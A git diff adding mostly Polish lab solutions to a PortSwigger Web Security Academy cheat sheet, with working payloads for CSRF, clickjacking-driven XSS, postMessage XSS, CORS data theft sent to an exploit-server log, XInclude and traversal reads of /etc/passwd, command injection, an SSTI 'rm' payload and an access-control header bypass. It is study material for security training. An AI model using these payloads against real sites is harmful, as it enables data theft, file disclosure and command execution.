@@ -31,14 +31,63 @@ body:document.cookie
 2. Podnieniamy cookie na zdobyte i wchodzimy na '/my-account`
 
 ## Cross-site request forgery (CSRF)
+### CSRF where token validation depends on token being present
+1. Wklejamy do exploi servera: 
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="$param1name" value="$param1value">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
 
 ## Clickjacking
+### Exploiting clickjacking vulnerability to trigger DOM-based XSS
+Exploit server:
+```html
+<style>
+	iframe {
+		position:relative;
+		width: 700;
+		height: 500;
+		opacity: 0.1;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top: 610;
+		left: 80;
+		z-index: 1;
+	}
+</style>
+<div>Test me</div>
+<iframe
+src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
 
 ## DOM-based vulnerabilities
+### DOM XSS using web messages
+Exploit server:
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
 
 ## Cross-origin resource sharing (CORS)
+### CORS vulnerability with trusted insecure protocols
+Exploit server:
+```html
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
 
 ## XML external entity (XXE) injection
+### Exploiting XInclude to retrieve files
+1. Podmnienamy productId na:
+```html
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
 
 ## Server-side request forgery (SSRF)
 ### SSRF with blacklist-based input filter
@@ -68,12 +117,36 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net
 ```
 
 ## OS command injection
+### Blind OS command injection with time delays
+1. W submit feedback podmieniamy email na:
+```
+email=x||ping+-c+10+127.0.0.1||
+```
 
 ## Server-side template injection
+### Basic server-side template injection
+1. Wpisujemy link:
+```url
+https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
+```
 
 ## Directory traversal
+Zmieniamy filename w pobieraniu zdjęcia na:
+```
+/etc/passwd
+```
 
 ## Access control vulnerabilities
+### URL-based access control can be circumvented
+Dodajemy do URLa: 
+```
+?username=carlos
+```
+Dodajemy header:
+```
+X-Original-URL: /admin/delete
+```
+
 
 ## Authentication
 ### Brute-forcing a stay-logged-in cookie
